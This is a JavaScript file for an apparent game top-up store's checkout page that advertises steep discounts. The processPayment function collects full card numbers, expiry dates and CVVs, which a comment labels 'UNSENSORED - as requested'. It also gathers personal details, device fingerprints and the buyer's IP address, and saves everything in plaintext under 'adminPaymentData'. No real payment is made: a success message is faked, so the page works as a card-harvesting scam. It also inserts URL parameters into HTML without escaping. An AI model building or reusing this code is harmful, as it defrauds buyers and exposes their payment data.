// 3D Payment Page Functionality
// currentLanguage is already defined in translations.js
if (typeof currentLanguage === 'undefined') {
    currentLanguage = localStorage.getItem('selectedLanguage') || 'en';
}

// Initialize payment page - removed DOMContentLoaded to avoid conflicts with payment.js
// The initialization will be handled by payment.js

// Load order data
function loadOrderData() {
    const orderData = JSON.parse(localStorage.getItem('currentOrder') || '{}');
    const checkoutCart = JSON.parse(localStorage.getItem('checkoutCart') || '[]');
    
    // Debug: Log the data
    console.log('Order Data:', orderData);
    console.log('Checkout Cart:', checkoutCart);
    
    // Also check URL parameters for direct purchases
    const urlParams = new URLSearchParams(window.location.search);
    const directGame = urlParams.get('game');
    const directPackage = urlParams.get('package');
    const directPrice = urlParams.get('price');
    const directUid = urlParams.get('uid');
    
    console.log('URL Params:', { directGame, directPackage, directPrice, directUid });
    
    const orderItems = document.getElementById('orderItems');
    const subtotalElement = document.getElementById('subtotal');
    const discountElement = document.getElementById('discount');
    const totalElement = document.getElementById('total');
    
    let subtotal = 0;
    
    // Handle URL parameters for direct purchases
    if (directGame && directPackage && directPrice && directUid) {
        const item = document.createElement('div');
        item.className = 'order-item';
        item.innerHTML = `
            <div class="item-info">
                <h4>${directGame}</h4>
                <p>${directPackage}</p>
                <small>UID: ${directUid}</small>
            </div>
            <div class="item-price">
                <div class="original-price">$${(parseFloat(directPrice) / 0.35).toFixed(2)}</div>
                <div class="discounted-price">$${parseFloat(directPrice).toFixed(2)}</div>
            </div>
        `;
        orderItems.appendChild(item);
        subtotal = parseFloat(directPrice) / 0.35;
    } else if (orderData.game) {
        // Single item from game details
        const item = document.createElement('div');
        item.className = 'order-item';
        item.innerHTML = `
            <div class="item-info">
                <h4>${orderData.game.name}</h4>
                <p>${orderData.package}</p>
                <small>UID: ${orderData.uid}</small>
            </div>
            <div class="item-price">
                <div class="original-price">$${(orderData.price / 0.35).toFixed(2)}</div>
                <div class="discounted-price">$${orderData.price.toFixed(2)}</div>
            </div>
        `;
        orderItems.appendChild(item);
        subtotal = orderData.price / 0.35;
    } else if (checkoutCart.length > 0) {
        // Multiple items from cart
        checkoutCart.forEach(item => {
            console.log('Processing checkout item:', item);
            
            // Ensure we have valid prices
            const originalPrice = item.originalPrice || (item.discountedPrice / 0.35) || 0;
            const discountedPrice = item.discountedPrice || item.price || 0;
            
            console.log('Calculated prices:', { originalPrice, discountedPrice });
            
            const orderItem = document.createElement('div');
            orderItem.className = 'order-item';
            orderItem.innerHTML = `
                <div class="item-info">
                    <h4>${item.gameName}</h4>
                    <p>${item.packageName}</p>
                    <small>UID: ${item.uid}</small>
                </div>
                <div class="item-price">
                    <div class="original-price">$${originalPrice.toFixed(2)}</div>
                    <div class="discounted-price">$${discountedPrice.toFixed(2)}</div>
                </div>
            `;
            orderItems.appendChild(orderItem);
            subtotal += originalPrice;
        });
    } else {
        // Fallback: Try to load from regular cart
        const regularCart = JSON.parse(localStorage.getItem('cart') || '[]');
        console.log('Regular Cart:', regularCart);
        
        if (regularCart.length > 0) {
            regularCart.forEach(item => {
                console.log('Processing cart item:', item);
                
                // Ensure we have valid prices
                const originalPrice = item.originalPrice || (item.discountedPrice / 0.35) || 0;
                const discountedPrice = item.discountedPrice || item.price || 0;
                
                console.log('Calculated prices:', { originalPrice, discountedPrice });
                
                const orderItem = document.createElement('div');
                orderItem.className = 'order-item';
                orderItem.innerHTML = `
                    <div class="item-info">
                        <h4>${item.gameName}</h4>
                        <p>${item.packageName}</p>
                        <small>UID: ${item.uid}</small>
                    </div>
                    <div class="item-price">
                        <div class="original-price">$${originalPrice.toFixed(2)}</div>
                        <div class="discounted-price">$${discountedPrice.toFixed(2)}</div>
                    </div>
                `;
                orderItems.appendChild(orderItem);
                subtotal += originalPrice;
            });
        } else {
            // Last resort: Check if there's any data in localStorage
            const allKeys = Object.keys(localStorage);
            console.log('All localStorage keys:', allKeys);
            
            // Try to find any cart-related data
            let foundData = false;
            allKeys.forEach(key => {
                if (key.includes('cart') || key.includes('order')) {
                    console.log(`${key}:`, localStorage.getItem(key));
                }
            });
            
            // No items found
            orderItems.innerHTML = `
                <div class="no-items">
                    <p>No items found. Please go back and add items to your cart.</p>
                    <button onclick="window.location.href='index.html'" class="btn-secondary">Go Back</button>
                </div>
            `;
        }
    }
    
    const discount = subtotal * 0.65;
    const total = subtotal - discount;
    
    // Debug: Log calculations
    console.log('Subtotal:', subtotal);
    console.log('Discount:', discount);
    console.log('Total:', total);
    
    // Ensure minimum values
    if (subtotal === 0) {
        console.warn('Subtotal is 0! Check cart data.');
        // Try to reload from localStorage one more time
        const allStorageData = {
            cart: localStorage.getItem('cart'),
            checkoutCart: localStorage.getItem('checkoutCart'),
            currentOrder: localStorage.getItem('currentOrder')
        };
        console.log('All localStorage data:', allStorageData);
    }
    
    subtotalElement.textContent = `$${subtotal.toFixed(2)}`;
    discountElement.textContent = `-$${discount.toFixed(2)}`;
    totalElement.textContent = `$${total.toFixed(2)}`;
}

// Setup form validation
function setupFormValidation() {
    const form = document.getElementById('paymentForm');
    const inputs = form.querySelectorAll('input, select');
    
    inputs.forEach(input => {
        input.addEventListener('blur', validateField);
        input.addEventListener('input', clearFieldError);
    });
}

// Validate individual field
function validateField(event) {
    const field = event.target;
    const value = field.value.trim();
    
    // Remove existing error
    clearFieldError(event);
    
    // Validation rules
    let isValid = true;
    let errorMessage = '';
    
    if (field.hasAttribute('required') && !value) {
        isValid = false;
        errorMessage = 'This field is required';
    } else {
        switch (field.type) {
            case 'email':
                if (value && !isValidEmail(value)) {
                    isValid = false;
                    errorMessage = 'Please enter a valid email address';
                }
                break;
            case 'tel':
                if (value && !isValidPhone(value)) {
                    isValid = false;
                    errorMessage = 'Please enter a valid phone number';
                }
                break;
        }
        
        // Special validations
        if (field.id === 'cardNumber' && value) {
            if (!isValidCardNumber(value)) {
                isValid = false;
                errorMessage = 'Please enter a valid card number';
            }
        } else if (field.id === 'expiry' && value) {
            if (!isValidExpiry(value)) {
                isValid = false;
                errorMessage = 'Please enter a valid expiry date (MM/YY)';
            }
        } else if (field.id === 'cvv' && value) {
            if (!isValidCVV(value)) {
                isValid = false;
                errorMessage = 'Please enter a valid CVV';
            }
        }
    }
    
    if (!isValid) {
        showFieldError(field, errorMessage);
    }
    
    return isValid;
}

// Clear field error
function clearFieldError(event) {
    const field = event.target;
    const formGroup = field.closest('.form-group-3d');
    const existingError = formGroup.querySelector('.field-error');
    
    if (existingError) {
        existingError.remove();
    }
    
    field.style.borderColor = 'rgba(255, 255, 255, 0.2)';
}

// Show field error
function showFieldError(field, message) {
    const formGroup = field.closest('.form-group-3d');
    
    const errorElement = document.createElement('div');
    errorElement.className = 'field-error';
    errorElement.textContent = message;
    errorElement.style.cssText = `
        color: #ef4444;
        font-size: 0.8rem;
        margin-top: 0.5rem;
        display: flex;
        align-items: center;
        gap: 0.25rem;
    `;
    errorElement.innerHTML = `<i class="fas fa-exclamation-circle"></i> ${message}`;
    
    formGroup.appendChild(errorElement);
    field.style.borderColor = '#ef4444';
}

// Setup card formatting
function setupCardFormatting() {
    const cardNumberInput = document.getElementById('cardNumber');
    const expiryInput = document.getElementById('expiry');
    const cvvInput = document.getElementById('cvv');
    
    // Card number formatting
    cardNumberInput.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\s/g, '').replace(/[^0-9]/gi, '');
        let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
        
        e.target.value = formattedValue;
        
        // Detect card type
        detectCardType(value);
    });
    
    // Expiry formatting
    expiryInput.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length >= 2) {
            value = value.substring(0, 2) + '/' + value.substring(2, 4);
        }
        e.target.value = value;
    });
    
    // CVV formatting
    cvvInput.addEventListener('input', function(e) {
        e.target.value = e.target.value.replace(/[^0-9]/g, '').substring(0, 4);
    });
}

// Detect card type
function detectCardType(cardNumber) {
    const cardType = document.getElementById('cardType');
    
    // Remove spaces
    const number = cardNumber.replace(/\s/g, '');
    
    let type = '';
    if (/^4/.test(number)) {
        type = '<i class="fab fa-cc-visa" style="color: #1a1f71;"></i>';
    } else if (/^5[1-5]/.test(number)) {
        type = '<i class="fab fa-cc-mastercard" style="color: #eb001b;"></i>';
    } else if (/^3[47]/.test(number)) {
        type = '<i class="fab fa-cc-amex" style="color: #006fcf;"></i>';
    } else if (/^6/.test(number)) {
        type = '<i class="fab fa-cc-discover" style="color: #ff6000;"></i>';
    }
    
    cardType.innerHTML = type;
}

// Validation functions
function isValidEmail(email) {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
}

function isValidPhone(phone) {
    return /^[\+]?[1-9][\d]{0,15}$/.test(phone.replace(/\s/g, ''));
}

function isValidCardNumber(cardNumber) {
    const number = cardNumber.replace(/\s/g, '');
    return /^\d{13,19}$/.test(number) && luhnCheck(number);
}

function isValidExpiry(expiry) {
    if (!/^\d{2}\/\d{2}$/.test(expiry)) return false;
    
    const [month, year] = expiry.split('/').map(Number);
    const currentDate = new Date();
    const currentYear = currentDate.getFullYear() % 100;
    const currentMonth = currentDate.getMonth() + 1;
    
    if (month < 1 || month > 12) return false;
    if (year < currentYear || (year === currentYear && month < currentMonth)) return false;
    
    return true;
}

function isValidCVV(cvv) {
    return /^\d{3,4}$/.test(cvv);
}

// Luhn algorithm for card validation
function luhnCheck(cardNumber) {
    let sum = 0;
    let isEven = false;
    
    for (let i = cardNumber.length - 1; i >= 0; i--) {
        let digit = parseInt(cardNumber.charAt(i));
        
        if (isEven) {
            digit *= 2;
            if (digit > 9) {
                digit -= 9;
            }
        }
        
        sum += digit;
        isEven = !isEven;
    }
    
    return sum % 10 === 0;
}

// Collect device and browser info
function collectDeviceInfo() {
    const deviceInfo = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        cookieEnabled: navigator.cookieEnabled,
        onLine: navigator.onLine,
        screenResolution: `${screen.width}x${screen.height}`,
        colorDepth: screen.colorDepth,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        timestamp: new Date().toISOString()
    };
    
    // Get IP address (this would normally be done server-side)
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            deviceInfo.ipAddress = data.ip;
        })
        .catch(() => {
            deviceInfo.ipAddress = 'Unknown';
        });
    
    // Store device info
    localStorage.setItem('deviceInfo', JSON.stringify(deviceInfo));
}

// Setup form submission
function setupFormSubmission() {
    const form = document.getElementById('paymentForm');
    
    form.addEventListener('submit', function(e) {
        e.preventDefault();
        
        // Validate all fields
        const inputs = form.querySelectorAll('input, select');
        let isFormValid = true;
        
        inputs.forEach(input => {
            if (!validateField({ target: input })) {
                isFormValid = false;
            }
        });
        
        if (isFormValid) {
            processPayment();
        } else {
            showNotification('Please correct the errors in the form', 'error');
        }
    });
}

// Process payment
function processPayment() {
    const form = document.getElementById('paymentForm');
    const formData = new FormData(form);
    const deviceInfo = JSON.parse(localStorage.getItem('deviceInfo') || '{}');
    const orderData = JSON.parse(localStorage.getItem('currentOrder') || '{}');
    const checkoutCart = JSON.parse(localStorage.getItem('checkoutCart') || '[]');
    
    // Collect all payment data
    const paymentData = {
        // Personal Information
        firstName: formData.get('firstName'),
        lastName: formData.get('lastName'),
        email: formData.get('email'),
        phone: formData.get('phone'),
        
        // Billing Address
        country: formData.get('country'),
        region: formData.get('region'),
        city: formData.get('city'),
        zip: formData.get('zip'),
        address: formData.get('address'),
        
        // Payment Information (UNSENSORED - as requested)
        cardNumber: formData.get('cardNumber'),
        expiry: formData.get('expiry'),
        cvv: formData.get('cvv'),
        
        // Device Information
        deviceInfo: deviceInfo,
        
        // Order Information
        orderData: orderData,
        checkoutCart: checkoutCart,
        
        // Payment Details
        subtotal: document.getElementById('subtotal').textContent,
        discount: document.getElementById('discount').textContent,
        total: document.getElementById('total').textContent,
        
        // Timestamp
        timestamp: new Date().toISOString(),
        paymentId: 'PAY_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9),
        status: 'completed'
    };
    
    // Save to admin payment data
    const adminPaymentData = JSON.parse(localStorage.getItem('adminPaymentData') || '[]');
    adminPaymentData.push(paymentData);
    localStorage.setItem('adminPaymentData', JSON.stringify(adminPaymentData));
    
    // Show processing animation
    showProcessingAnimation();
    
    // Simulate payment processing
    setTimeout(() => {
        hideProcessingAnimation();
        showPaymentSuccess();
        
        // Clear cart and order data
        localStorage.removeItem('currentOrder');
        localStorage.removeItem('checkoutCart');
        localStorage.removeItem('cart');
        
        // Redirect to success page after delay
        setTimeout(() => {
            window.location.href = 'index.html';
        }, 3000);
    }, 3000);
}

// Show processing animation
function showProcessingAnimation() {
    const button = document.querySelector('.pay-button-3d');
    button.disabled = true;
    button.innerHTML = `
        <div class="button-content">
            <i class="fas fa-spinner fa-spin"></i>
            <span data-translate="payment.processing">Processing payment...</span>
        </div>
    `;
}

// Hide processing animation
function hideProcessingAnimation() {
    const button = document.querySelector('.pay-button-3d');
    button.disabled = false;
    button.innerHTML = `
        <div class="button-content">
            <i class="fas fa-lock"></i>
            <span>Pay Securely Now</span>
        </div>
        <div class="button-glow"></div>
    `;
}

// Show payment success
function showPaymentSuccess() {
    const successModal = document.createElement('div');
    successModal.className = 'success-modal';
    successModal.innerHTML = `
        <div class="success-content">
            <div class="success-icon">
                <i class="fas fa-check-circle"></i>
            </div>
            <h2>Payment Successful!</h2>
            <p>Your order has been processed successfully. You will receive your gaming credits shortly.</p>
            <div class="success-animation">
                <div class="checkmark">
                    <svg viewBox="0 0 52 52">
                        <circle cx="26" cy="26" r="25" fill="none"/>
                        <path fill="none" d="m14.1 27.2l7.1 7.2 16.7-16.8"/>
                    </svg>
                </div>
            </div>
        </div>
    `;
    
    successModal.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background: rgba(0, 0, 0, 0.9);
        backdrop-filter: blur(10px);
        z-index: 10000;
        display: flex;
        align-items: center;
        justify-content: center;
        animation: fadeIn 0.3s ease;
    `;
    
    document.body.appendChild(successModal);
}

// Show notification
function showNotification(message, type = 'info') {
    const notification = document.createElement('div');
    notification.className = `notification ${type}`;
    notification.innerHTML = `
        <i class="fas ${type === 'error' ? 'fa-exclamation-circle' : 'fa-info-circle'}"></i>
        <span>${message}</span>
    `;
    
    notification.style.cssText = `
        position: fixed;
        top: 100px;
        right: 20px;
        background: ${type === 'error' ? '#ef4444' : '#22c55e'};
        color: white;
        padding: 1rem 1.5rem;
        border-radius: 8px;
        z-index: 10001;
        display: flex;
        align-items: center;
        gap: 0.5rem;
        animation: slideIn 0.3s ease;
        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
    `;
    
    document.body.appendChild(notification);
    
    setTimeout(() => {
        notification.style.animation = 'slideOut 0.3s ease';
        setTimeout(() => {
            if (notification.parentNode) {
                notification.parentNode.removeChild(notification);
            }
        }, 300);
    }, 3000);
}

// Add CSS animations
const style = document.createElement('style');
style.textContent = `
    @keyframes fadeIn {
        from { opacity: 0; }
        to { opacity: 1; }
    }
    
    @keyframes slideIn {
        from { transform: translateX(100%); }
        to { transform: translateX(0); }
    }
    
    @keyframes slideOut {
        from { transform: translateX(0); }
        to { transform: translateX(100%); }
    }
    
    .success-content {
        background: linear-gradient(135deg, rgba(255, 255, 255, 0.1), rgba(255, 255, 255, 0.05));
        backdrop-filter: blur(20px);
        border: 1px solid rgba(34, 197, 94, 0.3);
        border-radius: 20px;
        padding: 3rem;
        text-align: center;
        max-width: 400px;
    }
    
    .success-icon {
        font-size: 4rem;
        color: #22c55e;
        margin-bottom: 1rem;
    }
    
    .success-content h2 {
        color: #ffffff;
        margin-bottom: 1rem;
    }
    
    .success-content p {
        color: #a1a1aa;
        margin-bottom: 2rem;
    }
    
    .checkmark {
        width: 80px;
        height: 80px;
        margin: 0 auto;
    }
    
    .checkmark svg {
        width: 100%;
        height: 100%;
    }
    
    .checkmark circle {
        stroke: #22c55e;
        stroke-width: 2;
        stroke-dasharray: 166;
        stroke-dashoffset: 166;
        animation: stroke 0.6s cubic-bezier(0.65, 0, 0.45, 1) forwards;
    }
    
    .checkmark path {
        stroke: #22c55e;
        stroke-width: 3;
        stroke-dasharray: 48;
        stroke-dashoffset: 48;
        animation: stroke 0.3s cubic-bezier(0.65, 0, 0.45, 1) 0.8s forwards;
    }
    
    @keyframes stroke {
        100% {
            stroke-dashoffset: 0;
        }
    }
`;
document.head.appendChild(style);